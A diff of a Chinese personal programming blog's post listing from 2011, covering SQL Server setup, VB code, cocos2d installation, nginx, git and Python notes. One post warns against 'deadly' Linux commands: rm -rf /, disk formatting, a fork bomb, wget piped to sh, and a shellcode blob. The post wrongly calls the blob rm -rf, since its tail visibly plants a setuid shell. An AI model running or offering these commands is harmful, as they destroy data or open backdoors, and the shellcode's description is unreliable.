@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="由于编码问题，只能看清楚反馈回来的错误号是421，查询之后了解到这是因为ftp服务器限制同一个ip的连接数导致，于是在ftp的配置文件中找到最大连接数这个设置，由原来的5改成了500，重启ftp，没问题了。实际上我猜重启一下ftp也能解决问题的，5个最大连接数对于我自己来说也许就够用了吧。   &hellip;">
+	<meta name="description" content="并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。 昨晚下载了SQL SERVER 2008 R2 Express，才64MB，又下载了对应的Management Studio， &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,14 +79,48 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/05/17/no421-error-in-ftp/">
+		<a href="/blog/2011/07/16/sql-server-is-so-bad/">
 		
-			Ftp出现421错误</a>
+			SQL SERVER真差劲！</a>
 	</h2>
 	<div class="entry-content">
-		<p>由于编码问题，只能看清楚反馈回来的错误号是421，查询之后了解到这是因为ftp服务器限制同一个ip的连接数导致，于是在ftp的配置文件中找到最大连接数这个设置，由原来的5改成了500，重启ftp，没问题了。实际上我猜重启一下ftp也能解决问题的，5个最大连接数对于我自己来说也许就够用了吧。</p>
+		<p>并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。</p>
 
-<p> </p>
+<p>昨晚下载了SQL SERVER 2008 R2 Express，才64MB，又下载了对应的Management Studio，竟然需要270MB！后者安装很不容易，我的硬盘又很小，安装过程中由于失误的操作，复制了一个SQL实例出来，原本就一个叫SQLEXPRESS，现在多了一个MSSQLEXPRESS，本来就很小的空间又一次被减小了，而且还没装上Management！最后磁盘空间实在不够了，我关闭了win7的系统分页文件，一下子出来2.6GB，幸亏内存够大。</p>
+
+<p>安装完毕后，两个实例都在运行，首先关闭一个。然后配置另一个的TCP/IP协议，这样才能正常连接。这里需要说明一下，在【SQL网络配额协议】中的【实例名下】的【TCP/IP】地址，最后一个是IPALL，写上TCP端口：1433，保存。重启实例的服务就能用management连接上了。</p>
+
+<p>在vb中的一个测试代码：（数据库Test，dbo.Member表中有一行数据，tianzhen\tz_pwd）</p>
+
+<p>最可恶的是我在设计表的时候用了nchar类型，长度用了10，如果字段内容不足10就会加空格补全。所以在vb中对于要和数据库中对比的时候必须把从数据库中得到的数据trim一下。</p>
+
+<pre class="prettyprint linenums bush:vb" lang="vb">Imports System.Configuration
+Imports System.Data.SqlClient
+
+Public Class Form1
+
+   Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+       Dim connStr As String = "Data Source = localhost; Initial Catalog = Test; user id = sa; password = tianzhen;"
+       Dim conn As SqlConnection = New SqlConnection(connStr)
+       Dim cmd As SqlCommand = New SqlCommand()
+       cmd.Connection = conn
+       cmd.CommandText = "SELECT password FROM dbo.Member WHERE username = 'tianzhen'"
+       Dim reader As SqlDataReader
+       conn.Open()
+       reader = cmd.ExecuteReader()
+       Dim login As Boolean = False
+       If reader.Read() Then
+           If TextBox1.Text = Trim(reader("password")) Then
+               MsgBox("login successfully!")
+           Else
+               MsgBox("login fail!!!")
+           End If
+       End If
+       conn.Close()
+   End Sub
+End Class
+</pre>
+
 
 		
 		
@@ -106,11 +140,11 @@
   
 
 
-<time datetime="2011-05-17T13:09:00+08:00" pubdate data-updated="true">May 17<span>th</span>, 2011</time></div>
+<time datetime="2011-07-16T06:13:00+08:00" pubdate data-updated="true">Jul 16<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/ftp/'>ftp</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/sqlserver/'>sqlserver</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -122,28 +156,136 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/05/16/what-i-give-up-is-too-little/">
+		<a href="/blog/2011/07/15/install-cocos2d/">
 		
-			我放弃得还不算多</a>
+			安装cocos2d 1.0</a>
 	</h2>
 	<div class="entry-content">
-		<p>从内心来讲，我想要成为一个全能型的人，但很多事情证明了我基本上做不到这一点，我自己也认识到了做到这一会变得异常疲劳，就象是现实中的完美主义者一样，生活得很累，而且一个<a title="全能" href="http://www.youth2009.org/tag/%E5%85%A8%E8%83%BD/">全能</a>型的人往往难以相信别人，自己的地位是无庸置疑的，一旦和自己意见相左就完全认为是错误的，这点虽然在我身上没有导致致命错误，但我仍然是要激励避免的。</p>
+		<p>前天cocos2d更新到了1.0版本，这个版本对于开源软件来说是一个里程碑，因为这应该是第一个能够称得上稳定的版本，当然也是新阶段的开始。</p>
 
-<p>总之，我更想做一个<a title="单一" href="http://www.youth2009.org/tag/%E5%8D%95%E4%B8%80/">单一</a>一点的人，技术上专注几个领域，甚至是一个领域；生活上崇尚简洁的<a title="实用" href="http://www.youth2009.org/tag/%E5%AE%9E%E7%94%A8/">实用</a>主义，甚至极简主义也想试试。</p>
+<p>安装还是很简单的，我已经安装上了xcode4.0和sdk4.3。</p>
 
-<p>现在看来我的实用主义多是建立在拥有之上的，因为生活中的很多需要的、不太需要的东西（当然我这里并没有说完全不需要的东西我也拥有，因为在我看来没有一个人完全不需要的东西，只是暂时用不到而已，所以我一般说成不太需要）都拥有了，几乎是到了别无所求的程度，才进化到了<a title="实用" href="http://www.youth2009.org/tag/%E5%AE%9E%E7%94%A8/">实用</a>主义。这一点也能够从我不太迷恋游戏证明，看到周围不少人总是迷恋这些东西，可能是因为这些对于他们还算是新鲜的吧，对于我，可能是几年之前的产物了。虽然游戏的吸引程度在不断进步，但一个事物对于一个人的吸引力并不是随着技术的投入不断增大的，应该是有个上升的曲线，之后到达顶峰就趋于平缓。我想我应该到了那个平缓地带：）</p>
+<p>要注意一点的就是安装的时候需要root权限，用sudo即可。</p>
 
-<p>自我批判基本结束，那么我的<a title="单一" href="http://www.youth2009.org/tag/%E5%8D%95%E4%B8%80/">单一</a>化路线又该如何进行下去？</p>
+<pre class="prettyprint linenums bush:bash" lang="bash">dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sh ./install-templates.sh 
+cocos2d-iphone template installer
 
-<p>可能在以前的博文中提到过类似的观点，我是没有习惯翻看自己以前写得东西的（至少现在还没有），所以我宁愿重写都不愿看后总结。</p>
+Error: This script must be run as root in order to copy templates to /Library/Application Support/Developer/Shared/Xcode
 
-<p>技术上的<a title="单一" href="http://www.youth2009.org/tag/%E5%8D%95%E4%B8%80/">单一</a>化其实很难操作，只能凭借自己可能拥有的慧眼了，如果能够看到几年之后的发展方向那就没什么可说的了，现在应该没大有人喜欢做一些和潮流相反的事情，至少在我国是这样的，除了很少的领域，大部分都是按照一条清晰的脉络走下去，概括地讲可能还是围绕着资本的流动吧。</p>
+Try running it with 'sudo', or with '-u' to install it only you:
+  sudo ./install-templates.sh
+or:
+  ./install-templates.sh -u
+dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sudo sh ./install-templates.sh 
+Password:
+cocos2d-iphone template installer
 
-<p>不过惭愧地讲，我现在都不认为自己具备这样的慧眼，我也从没去锻炼，或许以后有吧。就目前的情况来看，我只能根据大概的市场潮流找出哪些东西是人们普遍关注的，未来怎么样很难说。但在现代软件技术这么发达的今天，未来的概念被弱化了，软件编写周期不断缩减，以个人为主体的超小型团队在不断涌现，他们有激情能够快速迭代产品，正因为如此才催生了<a title="移动互联网" href="http://www.youth2009.org/tag/%E7%A7%BB%E5%8A%A8%E4%BA%92%E8%81%94%E7%BD%91/">移动互联网</a>这样的新鲜事物（也不算新鲜了），这些在以前都难以预测，只是发生了我拿出来说说而已。</p>
 
-<p>不过值得庆幸的是我大致上找到了自己喜欢的技术领域，其实是一种愿景──自由、灵活。这一点无论在生活上还是其他方面，绝大多数人还是不希望被禁锢在他人的世界中，喜欢独自追逐点什么吧？至少在小时候是这样想过。那么技术上的自由、灵活呢？仍然难以描述，不过至少我能描述一下不<a title="自由" href="http://www.youth2009.org/tag/%E8%87%AA%E7%94%B1/">自由</a>的那些是什么样──比如java，看起来太正式、繁琐，但这并不阻碍它成为世界上最热门的编程语言。我希望的像是脚本语言那样随心所欲，能够快速构建产品的东西，当然就是Python、ROR等等。有时候还掺杂了不少个人生活上的原则，我不喜欢配置服务器，也担心哪天数据丢失了怎么办，所以我希望以后能够在云上做点什么，那里不需要管配置，可以全心投入到产品中，只是在国内，<a title="云" href="http://www.youth2009.org/tag/%E4%BA%91/">云</a>仍然太难到达终端用户手中。</p>
 
-<p>扯的稍微有点多，可能文章并没有分析出来How To，但写文章是梳理思绪的过程。剩下的就只有去做了！</p>
+Installing Xcode 4 cocos2d iOS template
+----------------------------------------------------
+
+...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/cocos2d/
+...copying cocos2d files
+...copying cocoslive files
+...copying TouchJSON files
+...copying CocosDenshion files
+...copying CocosDenshionExtras files
+...copying FontLabel files
+...copying template files
+done!
+
+
+
+Installing Xcode 4 Chipmunk iOS template
+----------------------------------------------------
+
+...copying Chipmunk files
+done!
+
+
+
+Installing Xcode 4 Box2d iOS template
+----------------------------------------------------
+
+...copying Box2d files
+done!
+
+
+
+Installing Xcode 4 CCNode file templates...
+----------------------------------------------------
+
+...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/File Templates/cocos2d/
+done!
+...creating cocos2d template directory
+
+
+
+
+Installing Xcode 3 cocos2d iOS template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+done!
+
+
+
+Installing Xcode 3 cocos2d iOS + box2d template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Box2d Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+...copying Box2D files
+done!
+
+
+
+Installing Xcode 3 cocos2d iOS + chipmunk template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Chipmunk Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+...copying Chipmunk files
+done!
+
+
+
+Installing Xcode 3 cocos2d Mac template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application - Mac/
+...copying template files
+...copying cocos2d files
+...copying CocosDenshion files
+done!
+...copying file templates
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/File Templates/cocos2d 1.0.0/
+
+
+
+Installing Xcode 3 CCNode file templates...
+----------------------------------------------------
+
+done!
+</pre>
+
 
 		
 		
@@ -163,11 +305,11 @@
   
 
 
-<time datetime="2011-05-16T23:33:00+08:00" pubdate data-updated="true">May 16<span>th</span>, 2011</time></div>
+<time datetime="2011-07-15T20:19:00+08:00" pubdate data-updated="true">Jul 15<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/quan-neng/'>全能</a>, <a class='category' href='/blog/categories/dan-[?]/'>单一</a>, <a class='category' href='/blog/categories/zhe-si/'>哲思</a>, <a class='category' href='/blog/categories/shi-yong/'>实用</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/yi-dong-hu-lian-wang/'>移动互联网</a>, <a class='category' href='/blog/categories/zi-you/'>自由</a>
+	<a class='category' href='/blog/categories/cocos2d/'>cocos2d</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -179,29 +321,44 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/05/14/i-am-tired-to-create-blog/">
+		<a href="/blog/2011/07/14/vb-net-programming-problems/">
 		
-			懒得写博客了</a>
+			VB.net考试上机题目汇总</a>
 	</h2>
 	<div class="entry-content">
-		<p>最近一直还在忙活学校的那个项目，还有自己要做的同学录，看着日子越来越紧张，我也变得越来越紧张：）</p>
+		<p>只是更新一下代码，因为在mac中的mono工作得不太好！！</p>
 
-<p>学校的项目还有不多的工作了，我赶紧忙活一下，最后的几个功能也差不多没问题了，琐碎的工作交给另一个人了，这几天我没管，希望他做了些什么吧。同学录的工作写了不少代码，没去统计，外部引用的js库太多了，一统计都是别人的工作：（</p>
+<p>1.求两个数的最大公约数和最小公倍数：</p>
 
-<p>今天下午用了下jquery的表单验证插件，调试了好久的remote方法，现在分享点经验：</p>
+<pre class="prettyprint linenums bush:vb" lang="vb">Module Module1
 
-<p>1.远程的查询方法我接受了post的提交方法，不过我感觉get也是没问题的，只是没去测试，修改这个是在remote中传入type:&lsquo;post&#8217;即可。</p>
+   Public Function Gcd(ByVal num1 As Integer, ByVal num2 As Integer) As Integer
+       If num2 = 0 Then
+           Return num1
+       Else
+           Return Gcd(num2, num1 Mod num2)
+       End If
+   End Function
 
-<p>2.remote要提交上去的data用这样的方法：function(){return xxx;}</p>
+   Public Sub Main()
+       Console.WriteLine("Input first num: ")
+       Dim num1 As Integer = Convert.ToInt32(Console.ReadLine())
+       Console.WriteLine("Input second num: ")
+       Dim num2 As Integer = Convert.ToInt32(Console.ReadLine())
+       Console.WriteLine("Gcd is :{0}", Gcd(num1, num2))
+       Console.WriteLine("Lcd is :{0}", (num1 * num2) / Gcd(num1, num2)) '两个数的积除以最大公约数就是最小公倍数
+       Console.ReadLine()
+   End Sub
 
-<p>3.remote对应的messages直接写remote即可，注意这里处理的是得到false结果显示的提示信息，所以查询数据库并返回值的那个页面要注意别写反了结果，当然要只能返回true或者false。我用php写的结果就是直接echo一个字符串，只有这样简单写才能让这个傻傻的remote认出来。一开始我还包装了一个json返回，现在想想根本就是奢望，根本不可能知道你的json是个什么东西！因为根本就没有告诉它去检查哪个元素的值：）</p>
+End Module
+</pre>
 
-<p>如果按照这个速度做下去，可能到6月6日能够交上去作品：）希望其他人做得不太好吧，那样我就有机会去深圳旅游（答辩）啦：）</p>
 
-<p>最后在这里说一下QQMap的API，除了单一只能玩js的以外没什么太大的失误，用起来比较顺手，只是和Google的想比，还差很远，如果不是为了参赛，我可能会去用Google的，但那个相对用起来会很麻烦的：─（</p>
+
+
 
 		
-		
+		<a href="/blog/2011/07/14/vb-net-programming-problems/" class="more-link">Read on &rarr;</a>
 	</div>
 
 
@@ -218,11 +375,11 @@
   
 
 
-<time datetime="2011-05-14T18:13:00+08:00" pubdate data-updated="true">May 14<span>th</span>, 2011</time></div>
+<time datetime="2011-07-14T18:17:00+08:00" pubdate data-updated="true">Jul 14<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/jquery/'>jQuery</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/bi-sai/'>比赛</a>, <a class='category' href='/blog/categories/biao-dan-yan-zheng/'>表单验证</a>
+	<a class='category' href='/blog/categories/vb/'>vb</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -234,12 +391,14 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/05/12/debug-is-a-work-that-wastes-time/">
+		<a href="/blog/2011/07/12/respect-your-limits/">
 		
-			Debug是个浪费时间的活儿</a>
+			尊重极限</a>
 	</h2>
 	<div class="entry-content">
-		<p>今晚为了实现一个有些漂亮的界面交互，我展开了和SESSION的战斗，明明同样使用的其他方法都能正常工作，偏偏这个就是不能了，这让我很奇怪，调试了很久都没有解决。网上搜索了很多内容也都看不到希望，其中一个朋友提到，这种问题很难解决，可能是对SESSION的机制不太了解吧，我也懒了，不去深入分析，好在丢失了这个好看的界面也不影响使用，我就等等吧，希望明天能够自动解决：）</p>
+		<p>尊重极限，如同尊重自己。</p>
+
+<p>刚刚从<a href="http://www.psychologies.com.cn/life/investigation/limits">这里</a>看到，尊重极限吧！</p>
 
 		
 		
@@ -259,7 +418,224 @@
   
 
 
-<time datetime="2011-05-12T23:06:00+08:00" pubdate data-updated="true">May 12<span>th</span>, 2011</time></div>
+<time datetime="2011-07-12T22:07:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/ji-xian/'>极限</a>, <a class='category' href='/blog/categories/jing-zhi-desheng-huo/'>精致de生活</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/12/7-deadly-command-on-linux/">
+		
+			看来的7条致命Linux命令</a>
+	</h2>
+	<div class="entry-content">
+		<pre class="prettyprint linenums bush:bash" lang="bash">1. rm -rf / 此命令将递归并强制删除 / 目录下的所有文件。
+2.
+
+char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+release */
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;”;
+
+这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
+3. mkfs.ext3 /dev/sda 这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
+4. : ( ){  : |:&amp; };: 著名的 fork bomp，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
+5. any_command &gt; /dev/sda 使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
+6. wget http://some_untrusted_source -O- | sh 不要从不信任的地方下载东西，这可能会获取恶意代码。
+7. mv /home/yourhomedirectory/* /dev/null 此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。</pre>
+
+
+<p>我在Mac系统下试用了第四条奇怪的明令，没什么效果，看来Mac还稍微安全一点。其他的就不试了……</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-12T18:11:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/an-quan/'>安全</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/10/nginx-location-config/">
+		
+			Nginx下的location配置</a>
+	</h2>
+	<div class="entry-content">
+		<p>原来的location只是处理了“/”的情况，结果访问一个目录，即使此目录下有index.html也不会成功显示，于是改成了这样：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">location ~.*\.(php|php5)?$
+{
+    处理php
+}</pre>
+
+
+<p>这样之后，发现直接访问目录或者域名的时候不能正常显示了，必须跟上index.php这样的才可以。</p>
+
+<p>最终改成这样，解决了问题：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">location / {
+               root html;
+               index index.html index.php;
+}
+location ~.*\.(php|php5)?$ {
+处理php
+}</pre>
+
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-10T20:15:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/nginx/'>nginx</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/10/git-export-function/">
+		
+			Git的导出功能</a>
+	</h2>
+	<div class="entry-content">
+		<p>用git管理项目的优势大家可能都看了许久了，我也是因为如此才用了git而不是svn、cvs这些。其实我是挺喜欢喜新厌旧的，因为新东西的出现并流行一定是比原来的有所突破，并且大多数人喜欢这种变革，所以为何不喜欢呢？</p>
+
+<p>用git管理项目不可避免要遇到导出功能，在svn和cvs上应该叫export功能，git上的这个功能似乎没找到，要这样做：先打包，再解压到一个地方去。还能接受吧。</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">git-archive --prefix=map/ master | tar -x -C ../map_e/</pre>
+
+
+<p>稍微解释一下，prefix指明了用哪个仓库，后面的master应该就是branch的名称了，然后把这些传递给了tar，因为不指明&mdash;format的时候默认用了tar方式打包，所以这里传递给tar解压到上层目录的map_e中，当然实际工作可以解压到生产服务器上去。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-10T08:13:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/export/'>export</a>, <a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/09/best-content-in-include_path/">
+		
+			最好在include_path中加上根</a>
+	</h2>
+	<div class="entry-content">
+		<p>刚刚用了下typecho博客插件——友情链接来添加一个友情链接，但发现很多php文件找不到了，很奇怪，以前是可以的，看到warning中的信息，有个include_path的相关东西，看看里面提到的路径是不是有需要的文件，结果没有，而在其中路径的下一级目录下有，这就怪了。</p>
+
+<p>Google说最好把include_path写成&#8221;./&ldquo;。是不是这样就是自动便利所有的内容了？我猜是的！当前的include_path中又pear的路径，我就先不删除了，linux系统下用冒号分隔各个路径，在前面加上一个点即可。</p>
+
+<p>重启php，再次访问，恢复正常！</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T16:54:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
@@ -275,16 +651,50 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/05/08/my-breakfast-is-dull/">
+		<a href="/blog/2011/07/09/seek-and-tell-in-python/">
 		
-			我的早餐很单调</a>
+			简要写写python的file中的tell和seek</a>
 	</h2>
 	<div class="entry-content">
-		<p>现在想来确实是很<a title="单调" href="http://www.youth2009.org/tag/%E5%8D%95%E8%B0%83/">单调</a>的<a title="早餐" href="http://www.youth2009.org/tag/%E6%97%A9%E9%A4%90/">早餐</a>──牛奶、鸡蛋、面包、燕麦片。几乎很难逃出这四样东西的组合，最近一段时间发现面包的地位越来越不行了，吃了热牛奶冲的燕麦片再去吃面包的话，会感觉不舒服，于是现在我很少再买一块切片面包，而是买个精美的小面包，这样就有食欲了！</p>
+		<p>对于一个<a title="file" href="http://www.youth2009.org/tag/file/">file</a>，调用<a title="tell" href="http://www.youth2009.org/tag/tell/">tell</a>能够知道现在的文件位置。<a title="seek" href="http://www.youth2009.org/tag/seek/">seek</a>是改变文件位置。  比如文件中有3行句子，readline后位置就到了第一行的最后，再readline就到了第二行的最后，readline后我调用了tell，看到的结果就是这样的。输出完<a title="tell" href="http://www.youth2009.org/tag/tell/">tell</a>我又使用了<a title="seek" href="http://www.youth2009.org/tag/seek/">seek</a>(0),这样文件位置就回到开头了，下次再调用readline就会输出原来第一行的内容了，这应该是很容易理解的。不明白可以亲自试试。</p>
 
-<p>早晨起来我是很孤独的，自己起来，一般会叫醒闹钟，然后去准备早晨吃的一些列饭：）等我吃完饭就会发现同宿舍的人起来了，接着就是白天的上课……</p>
+<pre class="prettyprint linenums bush:python" lang="python">from sys import argv
 
-<p>不过我感觉这样的生活挺优雅的，多半可能是因为自己有工作填充了空余时间，偶尔也能和几个好友聊天，不用整天光顾<a title="人人" href="http://www.youth2009.org/tag/%E4%BA%BA%E4%BA%BA/">人人</a>、<a title="空间" href="http://www.youth2009.org/tag/%E7%A9%BA%E9%97%B4/">空间</a>。但下一步想针对微博做出点工作，既然删除不了，就让自己上<a title="微博" href="http://www.youth2009.org/tag/%E5%BE%AE%E5%8D%9A/">微博</a>的频率低一些：─）</p>
+script, input_file = argv
+
+def print_all(f):
+   print f.read()
+
+def rewind(f):
+   f.seek(0)
+
+def print_a_line(line_count, f):
+   print line_count, f.readline()
+
+current_file = open(input_file)
+
+print "First let's print the while file:\n"
+print_all(current_file)
+
+print "Now let's rewind, kind of like a tape."
+rewind(current_file)
+
+print "Let's print three lines:"
+
+current_line = 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+rewind(current_file)
+
+current_line += 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+
+current_line += 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+</pre>
+
 
 		
 		
@@ -304,11 +714,11 @@
   
 
 
-<time datetime="2011-05-08T20:57:00+08:00" pubdate data-updated="true">May 8<span>th</span>, 2011</time></div>
+<time datetime="2011-07-09T15:12:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/wei-bo/'>微博</a>, <a class='category' href='/blog/categories/zao-can/'>早餐</a>, <a class='category' href='/blog/categories/jing-zhi-desheng-huo/'>精致de生活</a>
+	<a class='category' href='/blog/categories/file/'>file</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/seek/'>seek</a>, <a class='category' href='/blog/categories/tell/'>tell</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -320,28 +730,19 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/05/08/short-day/">
+		<a href="/blog/2011/07/09/python-one-star-and-two-star/">
 		
-			短暂的一天</a>
+			Python中的*和**</a>
 	</h2>
 	<div class="entry-content">
-		<p>其实今天里有不少事情发生，虽然在我身边不是什么大事，但要是真一件件记录起来，也要花些时间，甚至都记不全了。不过整个今天过完，稍微感觉有些短暂。</p>
+		<p>在<a title="python" href="http://www.youth2009.org/tag/python/">python</a>的函数参数中，可以在变量名称前面加一个或者两个星号代表不一样的变量类型：</p>
 
-<p>早晨起来竟然看起来《风之谷》，还没看一半就发现到8点了，这就去和几个同学做网站了，很快上午过去，下午依然，很快到了晚上，老师请客吃饭去了，很快到了睡觉前夕，很快到了现在。</p>
+<p>在stack overflow上看到有人问这两个的区别了，就转载过来答案吧：</p>
 
-<p>这两天一直在和Y帆讨论给网站起一个什么名字，想了好久都没有结果，于是我想到了她（这是另一个她），在我看来，她是能够体会到生活的人，虽然我们相距更远，但……有电话呢！</p>
+<blockquote>If the form *identifier is present, it is initialized to a tuple receiving any excess positional parameters, defaulting to the empty tuple. If the form **identifier is present, it is initialized to a new dictionary receiving any excess keyword arguments, defaulting to a new empty dictionary.</blockquote>
 
-<p>本以为能够从她那儿得到信息，不过很可惜，上天在故意考察我们么？就是不给我们机会。只好让她也慢慢思考，同时我感觉现在也不一定非要起出名字来。可以是在制作过程中不经意发现一个什么什么灵感：）</p>
 
-<p>我们经常拿豆瓣来和自己的网站对比，虽然离豆瓣的距离还有很远，但有一些东西是相通的，比如创意的原始性。我们能够确保产品是原创的，从创意到产品都是如此。这样逆着国内互联网产品发展路线前进，我相信会有压力的！但我们坚信未来是美好的，有实力的东西始终会走向高峰：）</p>
-
-<p>她还让我帮她找找看她们专业的期刊杂志，想要发表一些论文上去，或者是跟着某个教授作为第二作者什么的发表相关论文，这样对于她申请“国外”大学有所帮助，同时有一些社区志愿者服务的经验，公司推荐也不错。唉，最后忙活一场，帮出国了：（不过也不能这样想，爱她不就是给她最好的环境，即使这个环境并不是你自己。当然我谈不上爱，喜欢还是有些的。</p>
-
-<p>只是，国内这个学术圈应该也不算平静吧？长期的审稿制度又是怎么一回事我们从未涉足的人根本难以把握，我不想去发觉可恶的东西，但每次都是必经之路，暂且先不去管这些了。对于一个女生，能够用钱打通的环节自然都不算是难题了，还有些地方钱不怎么好用，那就是底线了。希望她多想想这些！</p>
-
-<p>所以我更希望她能在志愿者服务方面积累一点经验，工作经历也是不好搞的：）</p>
-
-<p>唉，这个社会，一个女人起步，总是要有所顾虑，难一些的！</p>
+<p><span style="font-family: Arial, 'Liberation Sans', 'DejaVu Sans', sans-serif;"><span style="border-collapse: collapse;">加一个星号代表这个参数是一个tuple类型；加两个则是一个dictionary类型，很好用。</span></span></p>
 
 		
 		
@@ -361,199 +762,11 @@
   
 
 
-<time datetime="2011-05-08T00:06:00+08:00" pubdate data-updated="true">May 8<span>th</span>, 2011</time></div>
+<time datetime="2011-07-09T14:44:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
